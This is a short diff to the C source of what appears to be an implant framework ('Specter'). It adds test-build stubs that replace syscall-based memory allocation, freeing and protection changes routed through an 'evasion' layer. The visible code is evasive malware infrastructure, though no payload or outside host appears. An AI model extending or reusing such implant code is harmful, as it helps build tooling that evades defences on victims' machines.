@@ -19,6 +19,7 @@
 #include "task_exec.h"
 
 #ifdef TEST_BUILD
+#include <stdlib.h>
 #ifndef AF_INET
 #define AF_INET         2
 #define SOCK_STREAM    1
@@ -482,6 +483,10 @@ void bus_prepare_slot_api(MODULE_BUS_API *api, DWORD slot_idx) {
 /* ------------------------------------------------------------------ */
 
 static PVOID bus_mem_alloc(SIZE_T size, DWORD perms) {
+#ifdef TEST_BUILD
+    (void)perms;
+    return calloc(1, (size_t)size);
+#else
     PVOID base = NULL;
     SIZE_T alloc_size = size;
     HANDLE process = (HANDLE)-1;  /* NtCurrentProcess */
@@ -502,12 +507,17 @@ static PVOID bus_mem_alloc(SIZE_T size, DWORD perms) {
 #endif
 
     return base;
+#endif
 }
 
 static BOOL bus_mem_free(PVOID ptr) {
     if (!ptr)
         return FALSE;
 
+#ifdef TEST_BUILD
+    free(ptr);
+    return TRUE;
+#else
 #ifndef SPECTER_BAREBONE_MODULES
     /* Untrack from sleep heap list */
     IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)g_bus_ctx.implant_ctx;
@@ -522,12 +532,18 @@ static BOOL bus_mem_free(PVOID ptr) {
         process, &ptr, &size, (ULONG)MEM_RELEASE);
 
     return NT_SUCCESS(status);
+#endif
 }
 
 static BOOL bus_mem_protect(PVOID ptr, SIZE_T size, DWORD perms) {
     if (!ptr)
         return FALSE;
 
+#ifdef TEST_BUILD
+    (void)size;
+    (void)perms;
+    return TRUE;
+#else
     ULONG old_protect;
     HANDLE process = (HANDLE)-1;
     NTSTATUS status = evasion_syscall(bus_get_evasion(),
@@ -535,6 +551,7 @@ static BOOL bus_mem_protect(PVOID ptr, SIZE_T size, DWORD perms) {
         process, &ptr, &size, (ULONG)perms, &old_protect);
 
     return NT_SUCCESS(status);
+#endif
 }
 
 /* ------------------------------------------------------------------ */
